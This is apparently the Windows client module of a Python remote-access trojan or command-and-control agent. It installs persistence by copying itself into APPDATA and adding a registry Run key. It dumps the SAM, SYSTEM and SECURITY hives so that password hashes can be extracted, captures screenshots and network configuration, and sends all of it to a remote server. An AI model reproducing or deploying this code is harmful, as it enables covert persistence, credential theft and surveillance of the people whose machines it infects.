import platform
import sys, os, subprocess
import secrets
import shutil, mss, mss.tools

if platform.system() == 'Windows':
    import winreg

from client import Client

TEMP_PATH = os.path.join('C:', 'Windows', 'Temp')
SAM_TEMP_PATH = os.path.join(TEMP_PATH, 'sam')
SYSTEM_TEMP_PATH = os.path.join(TEMP_PATH, 'system')
SECURITY_TEMP_PATH = os.path.join(TEMP_PATH, 'security')


class WindowsClient(Client):

    ####################################################################################################################
    ################################################# CONSTRUCTOR ######################################################
    ####################################################################################################################
    def __init__(self, server_address, server_port):
        super().__init__(server_address, server_port)

    ####################################################################################################################
    ############################################## USUAL METHODS #######################################################
    ####################################################################################################################

    def persistence(self):
        self.agent_path = os.path.join(os.getenv('APPDATA'), f"{self.uid}.exe")

        # Check if Persistence is already in place
        if os.path.exists(self.agent_path):
            return 0

        try:
            shutil.copy2(sys.argv[0], self.agent_path)

        except Exception as e:
            return 1

        # Add the exe to startup programs
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Stryfe", 0, winreg.REG_SZ, self.agent_path)
        winreg.CloseKey(key)

    ####################################################################################################################
    ########################################### CLIENT COMMANDS ########################################################
    ####################################################################################################################

    def hashdump(self, args):
        print("In hashdump windows client")

        # Delete files if they exist to avoid entering in interactive mode
        self.delete_file(SAM_TEMP_PATH)
        subprocess.run("reg save HKLM\\SAM %s" % SAM_TEMP_PATH, shell=True)
        self.delete_file(SYSTEM_TEMP_PATH)
        subprocess.run("reg save HKLM\\SYSTEM %s" % SYSTEM_TEMP_PATH, shell=True)
        self.delete_file(SECURITY_TEMP_PATH)
        subprocess.run("reg save HKLM\\SECURITY %s" % SECURITY_TEMP_PATH, shell=True)

        self.send_file(SAM_TEMP_PATH)
        self.send_file(SYSTEM_TEMP_PATH)
        self.send_file(SECURITY_TEMP_PATH)

    def ipconfig(self, args):
        output = subprocess.check_output("ipconfig /all", shell=True, text=True, encoding='utf-8', errors='ignore')
        self.secure_sock.sendall(output.encode())

    def screenshot(self, args):
        appdata = os.getenv('APPDATA')
        screen_path = os.path.join(appdata, f"{secrets.token_hex(5)}.jpg")

        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)

        self.send_file(screen_path)
        self.delete_file(screen_path)